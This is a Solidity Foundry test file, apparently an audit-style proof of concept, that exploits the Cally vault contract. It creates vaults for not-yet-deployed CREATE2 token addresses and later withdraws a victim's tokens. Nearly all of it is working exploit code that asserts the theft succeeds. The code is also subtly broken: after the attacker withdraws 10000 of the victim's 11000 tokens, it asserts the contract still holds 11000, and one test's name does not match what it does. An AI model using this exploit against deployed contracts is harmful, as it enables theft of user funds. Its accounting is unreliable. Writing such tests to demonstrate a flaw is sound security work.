// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/Cally.sol";
import "solmate/tokens/ERC20.sol";

// Mock token that will be deployed later
contract MockToken is ERC20 {
    constructor() ERC20("Mock Token", "MOCK", 18) {
        _mint(msg.sender, 1000000e18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract CallyExploitTest is Test {
    Cally public cally;
    MockToken public token;
    
    // Attacker and victim addresses
    address public attacker = address(0x1);
    address public victim = address(0x2);
    
    // This will be the future token address (empty initially)
    address public futureTokenAddress;
    
    function setUp() public {
        // Deploy Cally contract
        cally = new Cally();
        
        // Calculate a predictable future token address using CREATE2
        // We'll use a simple salt and deployer address for predictability
        bytes32 salt = keccak256(abi.encodePacked("MOCK_TOKEN_SALT"));
        futureTokenAddress = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            keccak256(type(MockToken).creationCode)
        )))));
        
        // Verify the address is empty (no code)
        assertEq(futureTokenAddress.code.length, 0, "Future token address should be empty initially");
        
        // Fund attacker and victim with ETH
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
    }
    
    function testExploitPreDeploymentVault() public {
        // Step 1: Attacker creates vaults for future token addresses
        // This simulates the attacker setting traps for popular tokens that might be deployed later
        
        vm.startPrank(attacker);
        
        // Create vault for non-existent token with large amount
        // This will succeed because SafeTransferLib doesn't check for code existence
        uint256 attackerVaultId = cally.createVault(
            10000e18, // Large amount of "tokens"
            futureTokenAddress, // Address with no code
            0, // premiumIndex
            30, // durationDays
            0, // dutchAuctionStartingStrikeIndex
            1 ether, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );
        
        vm.stopPrank();
        
        // Verify vault was created successfully despite no token contract
        assertEq(cally.ownerOf(attackerVaultId), attacker, "Attacker should own the vault");
        
        // Step 2: Time passes - token gets deployed at the same address
        // This simulates a project deploying their token on this chain with the same address
        bytes32 deploySalt = keccak256(abi.encodePacked("MOCK_TOKEN_SALT"));
        vm.prank(address(this));
        token = new MockToken{salt: deploySalt}();
        
        // Verify token was deployed at the expected address
        assertEq(address(token), futureTokenAddress, "Token should be deployed at expected address");
        assertEq(futureTokenAddress.code.length > 0, true, "Token address should now have code");
        
        // Step 3: Victim creates a legitimate vault with the same token
        vm.startPrank(victim);
        
        // Mint tokens to victim
        token.mint(victim, 11000e18);
        
        // Victim approves and creates vault
        token.approve(address(cally), 11000e18);
        uint256 victimVaultId = cally.createVault(
            11000e18,
            address(token),
            0,
            30,
            0,
            1 ether,
            Cally.TokenType.ERC20
        );
        
        vm.stopPrank();
        
        // Step 4: Attacker exploits by withdrawing from their pre-deployment vault
        vm.startPrank(attacker);
        
        // Initiate withdrawal on attacker's vault
        cally.initiateWithdraw(attackerVaultId);
        
        // Fast forward past expiration
        vm.warp(block.timestamp + 31 days);
        
        // Attacker withdraws - they get tokens they never deposited!
        // The contract thinks the attacker deposited 10000e18 tokens
        // But in reality, no tokens were transferred during vault creation
        cally.withdraw(attackerVaultId);
        
        vm.stopPrank();
        
        // Verify exploit success
        assertEq(token.balanceOf(attacker), 10000e18, "Attacker should have stolen 10000 tokens");
        
        // The victim's vault still has their tokens, but the protocol has been drained
        assertEq(token.balanceOf(victim), 0, "Victim's tokens are in the vault");
        
        // Total tokens in contract should be victim's 11000e18
        assertEq(token.balanceOf(address(cally)), 11000e18, "Contract should hold victim's tokens");
    }
    
    function testCannotExploitWithCodeCheck() public {
        // This test shows the exploit would fail with proper code checking
        
        // Deploy token first
        bytes32 deploySalt = keccak256(abi.encodePacked("MOCK_TOKEN_SALT"));
        vm.prank(address(this));
        token = new MockToken{salt: deploySalt}();
        
        vm.startPrank(attacker);
        
        // Try to create vault with non-existent address (should fail with proper checks)
        address nonExistentAddress = address(0x123456789);
        
        // This would fail if the contract checked for code existence
        // But with current implementation, it succeeds silently
        try cally.createVault(
            10000e18,
            nonExistentAddress,
            0,
            30,
            0,
            1 ether,
            Cally.TokenType.ERC20
        ) {
            // Current implementation allows this - vulnerability confirmed
            assertTrue(true, "Vulnerability: vault created for non-existent token");
        } catch {
            // This would be the expected behavior with proper checks
            assertTrue(false, "Should not reach here with current implementation");
        }
        
        vm.stopPrank();
    }
    
    function testMultiplePreDeploymentVaults() public {
        // Test creating multiple vaults for different future token addresses
        vm.startPrank(attacker);
        
        // Create multiple vaults for different potential token addresses
        address[] memory futureAddresses = new address[](3);
        uint256[] memory vaultIds = new uint256[](3);
        
        for (uint256 i = 0; i < 3; i++) {
            bytes32 salt = keccak256(abi.encodePacked("potential", i));
            futureAddresses[i] = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(type(MockToken).creationCode)
            )))));
            
            // Verify address is empty
            assertEq(futureAddresses[i].code.length, 0, "Address should be empty");
            
            // Create vault for this future token
            vaultIds[i] = cally.createVault(
                5000e18 * (i + 1), // Different amounts
                futureAddresses[i],
                0,
                30,
                0,
                1 ether,
                Cally.TokenType.ERC20
            );
        }
        
        vm.stopPrank();
        
        // Now deploy one of the tokens
        bytes32 deploySalt = keccak256(abi.encodePacked("potential", 1));
        vm.prank(address(this));
        MockToken deployedToken = new MockToken{salt: deploySalt}();
        
        // Verify it matches one of our predicted addresses
        assertEq(address(deployedToken), futureAddresses[1], "Token deployed at predicted address");
        
        // Mint tokens to victim
        vm.startPrank(victim);
        deployedToken.mint(victim, 20000e18);
        deployedToken.approve(address(cally), 20000e18);
        
        // Victim creates vault
        cally.createVault(
            20000e18,
            address(deployedToken),
            0,
            30,
            0,
            1 ether,
            Cally.TokenType.ERC20
        );
        vm.stopPrank();
        
        // Attacker withdraws from their pre-deployment vault
        vm.startPrank(attacker);
        cally.initiateWithdraw(vaultIds[1]);
        vm.warp(block.timestamp + 31 days);
        cally.withdraw(vaultIds[1]);
        vm.stopPrank();
        
        // Verify attacker stole tokens
        assertEq(deployedToken.balanceOf(attacker), 10000e18, "Attacker stole 10000 tokens");
    }
}